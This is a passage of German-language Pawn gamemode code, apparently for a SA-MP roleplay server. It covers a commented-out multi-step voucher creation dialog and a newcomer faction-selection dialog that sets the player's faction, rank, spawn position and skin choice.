				    strmid(Gutschein[MakeGutschein[playerid]][gutscheincode],"Unbekannt",0,strlen("Unbekannt"),16);
				    strmid(Gutschein[MakeGutschein[playerid]][gutscheinname],"Unbekannt",0,strlen("Unbekannt"),32);
				    strmid(Gutschein[MakeGutschein[playerid]][gutscheindesc],"Unbekannt",0,strlen("Unbekannt"),64);
                    Gutschein[MakeGutschein[playerid]][gutscheintyp] = 0;
                    Gutschein[MakeGutschein[playerid]][gutscheinmenge] = 0;
					Gutschein[MakeGutschein[playerid]][gutscheinanzahl] = 0;
					MakeGutschein[playerid] = 0;
				}
				return 1;
			}
			if(response == 1)
			{
				if(!strlen(inputtext) || strlen(inputtext) > 16)
			    {
					ShowPlayerDialog(playerid,GUTSCHEIN_CREATE_CODE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 1","Gib deinen Gutscheincode ein:","Weiter","Gutschein löschen");
					return SendClientMessage(playerid,COLOR_GREY,"Du musst schon einen Text eingeben./Du kannst nicht mehr als 16 zeichen benutzen.");
				}
				else
				{
				    strmid(Gutschein[MakeGutschein[playerid]][gutscheincode],inputtext,0,strlen(inputtext),16);
				    format(string,sizeof(string),"Gutscheinerstellung Fortschritt:\nGutscheincode: %s\nGebe nun den Gutscheinnamen ein:",Gutschein[MakeGutschein[playerid]][gutscheincode]);
				    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_NAME,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 2",string,"Weiter","Zurück");
					return 1;
				}
			}
		}
	    if(dialogid ==  GUTSCHEIN_DIALOG_NAME)
	    {
			new string[256];
			if(response == 0)
		    {
			    format(string,sizeof(string),"Gutscheinerstellung Fortschritt:\nGutscheincode: %s\nGebe nun den Gutscheinnamen ein:",Gutschein[MakeGutschein[playerid]][gutscheincode]);
			    ShowPlayerDialog(playerid,GUTSCHEIN_CREATE_CODE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 1","Gib deinen Gutscheincode ein:","Weiter","Gutschein löschen");
			    return 1;
		    }
		    if(response == 1)
		    {
			    if(!strlen(inputtext) || strlen(inputtext) > 32)
			    {
					format(string,sizeof(string),"Gutscheinerstellung Fortschritt:\nGutscheincode: %s\nGebe nun den Gutscheinnamen ein:",Gutschein[MakeGutschein[playerid]][gutscheincode]);
				    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_NAME,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 2",string,"Weiter","Zurück");
				    return SendClientMessage(playerid,COLOR_GREY,"Du musst schon einen Text eingeben./Du kannst nicht mehr als 32 zeichen benutzen.");
				}
				else
				{
				    strmid(Gutschein[MakeGutschein[playerid]][gutscheinname],inputtext,0,strlen(inputtext),64);
				    format(string,sizeof(string),"Gutscheinerstellung Fortschritt:\nGutscheincode: %s\nGutscheinname: %s\nGebe nun die Gutscheinbeschreibung ein:",Gutschein[MakeGutschein[playerid]][gutscheincode],Gutschein[MakeGutschein[playerid]][gutscheinname]);
				    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_DESC,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 3",string,"Weiter","Zurück");
					return 1;
				}
			}
		}
	    if(dialogid ==  GUTSCHEIN_DIALOG_DESC)
	    {
			new string[256];
			if(response == 0)
		    {
			    format(string,sizeof(string),"Gutscheinerstellung Fortschritt:\nGutscheincode: %s\nGebe nun den Gutscheinnamen ein:",Gutschein[MakeGutschein[playerid]][gutscheincode]);
			    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_NAME,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 2",string,"Weiter","Zurück");
			    return 1;
		    }
		    if(response == 1)
		    {
			    if(!strlen(inputtext) || strlen(inputtext) > 64)
			    {
					format(string,sizeof(string),"Gutscheinerstellung Fortschritt:\nGutscheincode: %s\nGutscheinname: %s\nGebe nun die Gutscheinbeschreibung ein:",Gutschein[MakeGutschein[playerid]][gutscheincode],Gutschein[MakeGutschein[playerid]][gutscheinname]);
				    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_DESC,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 3",string,"Weiter","Zurück");
				    return SendClientMessage(playerid,COLOR_GREY,"Du musst schon einen Text eingeben./Du kannst nicht mehr als 64 zeichen benutzen.");
				}
				else
				{
				    strmid(Gutschein[MakeGutschein[playerid]][gutscheindesc],inputtext,0,strlen(inputtext),64);
				    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_TYP,DIALOG_STYLE_LIST,"Gutscheinerstellung Schritt 4","Level\nDonartorZeit\nFahrzeug\nRespektpunkte\nGeld","Weiter","Zurück");
					return 1;
				}
			}
		}
	    if(dialogid ==  GUTSCHEIN_DIALOG_TYP)
	    {
			new string[256];
			if(response == 0)
		    {
			    format(string,sizeof(string),"Gutscheinerstellung Fortschritt:\nGutscheincode: %s\nGutscheinname: %s\nGebe nun die Gutscheinbeschreibung ein:",Gutschein[MakeGutschein[playerid]][gutscheincode],Gutschein[MakeGutschein[playerid]][gutscheinname]);
			    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_DESC,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 3",string,"Weiter","Zurück");
			    return 1;
		    }
		    if(response == 1)
		    {
			    switch(listitem)
			    {
				    case 0:
				    {//Level
				        Gutschein[MakeGutschein[playerid]][gutscheintyp] = 1;
			    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Level soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
			    		return 1;
				    }
				    case 1:
				    {//DonatorZeit
				        Gutschein[MakeGutschein[playerid]][gutscheintyp] = 2;
			    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel DonatorZeit soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
			    		return 1;
				    }
                    case 2:
				    {//Fahrzeuge
				        Gutschein[MakeGutschein[playerid]][gutscheintyp] = 3;
	    				ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Welches Fahrzeug soll man erhalten:","Weiter","Zurück");
	    				return 1;
				    }
				    case 3:
				    {//Respektpunkte
				        Gutschein[MakeGutschein[playerid]][gutscheintyp] = 4;
			    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viele Respektpunkte soll man erhalten:","Weiter","Zurück");
			    		return 1;
				    }
					case 4:
				    {//Geld
				        Gutschein[MakeGutschein[playerid]][gutscheintyp] = 5;
			    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Geld soll man erhalten:","Weiter","Zurück");
			    		return 1;
				    }
				}
			}
		}
	    if(dialogid == GUTSCHEIN_DIALOG_MENGE)
	    {
			new anzahl = strval(inputtext);
			if(response == 0)
			{
				ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_TYP,DIALOG_STYLE_LIST,"Gutscheinerstellung Schritt 4","Level\nDonartorZeit\nFahrzeug\nRespektpunkte\nGeld","Weiter","Zurück");
				return 1;
			}
			if(response == 1)
			{
    			if(!strlen(inputtext))
			    {
			        switch(Gutschein[MakeGutschein[playerid]][gutscheintyp])
			        {
						case 1:
					    {//Level
				    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Level soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
				    		return 1;
					    }
					    case 2:
					    {//DonatorZeit
				    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel DonatorZeit soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
				    		return 1;
					    }
	                    case 3:
					    {//Fahrzeuge
		    				ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Welches Fahrzeug soll man erhalten:","Weiter","Zurück");
		    				return 1;
					    }
					    case 4:
					    {//Respektpunkte
				    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viele Respektpunkte soll man erhalten:","Weiter","Zurück");
				    		return 1;
					    }
						case 5:
					    {//Geld
				    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Geld soll man erhalten:","Weiter","Zurück");
				    		return 1;
					    }
					}
					return 1;
				}
				if(!IsNumeric(inputtext))
				{
					switch(Gutschein[MakeGutschein[playerid]][gutscheintyp])
			        {
						case 1:
					    {//Level
				    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Level soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
				    		return 1;
					    }
					    case 2:
					    {//DonatorZeit
				    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel DonatorZeit soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
				    		return 1;
					    }
	                    case 3:
					    {//Fahrzeuge
		    				ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Welches Fahrzeug soll man erhalten:","Weiter","Zurück");
		    				return 1;
					    }
					    case 4:
					    {//Respektpunkte
				    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viele Respektpunkte soll man erhalten:","Weiter","Zurück");
				    		return 1;
					    }
						case 5:
					    {//Geld
				    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Geld soll man erhalten:","Weiter","Zurück");
				    		return 1;
					    }
					}
					return SendClientMessage(playerid,COLOR_GREY,"Gebe nur Zahlen ein!");
				}
				else
				{
				    if(anzahl <= 0)
				    {
				        switch(Gutschein[MakeGutschein[playerid]][gutscheintyp])
				        {
							case 1:
						    {//Level
					    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Level soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
					    		return 1;
						    }
						    case 2:
						    {//DonatorZeit
					    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel DonatorZeit soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
					    		return 1;
						    }
		                    case 3:
						    {//Fahrzeuge
			    				ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Welches Fahrzeug soll man erhalten:","Weiter","Zurück");
			    				return 1;
						    }
						    case 4:
						    {//Respektpunkte
					    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viele Respektpunkte soll man erhalten:","Weiter","Zurück");
					    		return 1;
						    }
							case 5:
						    {//Geld
					    		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Geld soll man erhalten:","Weiter","Zurück");
					    		return 1;
						    }
						}
						return SendClientMessage(playerid,COLOR_GREY,"Die Menge muss > 0!");
					}
				    if((Gutschein[MakeGutschein[playerid]][gutscheintyp] == 3) && (anzahl<400||anzahl>611))
				    {
       					ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Welches Fahrzeug soll man erhalten:","Weiter","Zurück");
						return SendClientMessage(playerid,COLOR_GREY,"Model 400-611!!");
					}
				    Gutschein[MakeGutschein[playerid]][gutscheinmenge] = anzahl;
				    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_ANZAHL,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 6","Wie oft kann dieser Gutschein verwendet werden:","Weiter","Zurück");
					return 1;
				}
			}
		}
	    if(dialogid ==  GUTSCHEIN_DIALOG_ANZAHL)
	    {
	 		new anzahl = strval(inputtext);
			if(response == 0)
		    {
			    switch(Gutschein[MakeGutschein[playerid]][gutscheintyp])
   				{
					case 1:
		   			{//Level
		 				ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Level soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
		 				return 1;
		   			}
				   	case 2:
				   	{//DonatorZeit
				 		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel DonatorZeit soll man bei diesem Gutschein erhalten:","Weiter","Zurück");
				 		return 1;
				   	}
				   	case 3:
				   	{//Fahrzeuge
						ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Welches Fahrzeug soll man erhalten:","Weiter","Zurück");
						return 1;
				   	}
				   	case 4:
		  	 		{//Respektpunkte
				 		ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viele Respektpunkte soll man erhalten:","Weiter","Zurück");
				 		return 1;
				   	}
					case 5:
		   			{//Geld
		 				ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_MENGE,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 5","Wie viel Geld soll man erhalten:","Weiter","Zurück");
		 				return 1;
		   			}
				}
			    return 1;
		    }
		    if(response == 1)
		    {
		        if(!strlen(inputtext))
			    {
			        ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_ANZAHL,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 6","Wie oft kann dieser Gutschein verwendet werden:","Weiter","Zurück");
			        return 1;
			    }
		        if(!IsNumeric(inputtext))
				{
				    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_ANZAHL,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 6","Wie oft kann dieser Gutschein verwendet werden:","Weiter","Zurück");
				    return SendClientMessage(playerid,COLOR_GREY,"Gebe nur Zahlen ein!");
				}
				else if(anzahl <= 0)
    			{
    			    ShowPlayerDialog(playerid,GUTSCHEIN_DIALOG_ANZAHL,DIALOG_STYLE_INPUT,"Gutscheinerstellung Schritt 6","Wie oft kann dieser Gutschein verwendet werden:","Weiter","Zurück");
    			    return SendClientMessage(playerid,COLOR_GREY,"Anzahl muss > 0 sein!");
    			}
    			else
    			{
			    	SendClientMessage(playerid,GELB,"Gutschein erfolgreich erstellt!");
			    	MakeGutschein[playerid] = 0;
			    	Gutschein[MakeGutschein[playerid]][gutscheinanzahl] = anzahl;
				}
				return 1;
			}
		}



*/






    if(dialogid == DIALOG_NEULINGSFRAK)
    {
        if(response)
        {
            switch(listitem)
            {
                case 0:
				{

        	    }
                case 1:
				{

							//--------------------------------------
							PlayerInfo[playerid][sMember] = 1;
							PlayerInfo[playerid][pMember] = 1;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 2:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 2;
							PlayerInfo[playerid][pMember] = 2;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 3:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 3;
							PlayerInfo[playerid][pMember] = 3;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 4:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 4;
							PlayerInfo[playerid][pMember] = 4;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 5:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 5;
							PlayerInfo[playerid][pMember] = 5;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 6:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 6;
							PlayerInfo[playerid][pMember] = 6;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 7:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 7;
							PlayerInfo[playerid][pMember] = 7;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 8:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 8;
							PlayerInfo[playerid][pMember] = 8;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 9:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 9;
							PlayerInfo[playerid][pMember] = 9;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 10:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 10;
							PlayerInfo[playerid][pMember] = 10;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 11:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 11;
							PlayerInfo[playerid][pMember] = 11;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 12:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 12;
							PlayerInfo[playerid][pMember] = 12;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 13:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 13;
							PlayerInfo[playerid][pMember] = 13;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 14:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 14;
							PlayerInfo[playerid][pMember] = 14;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
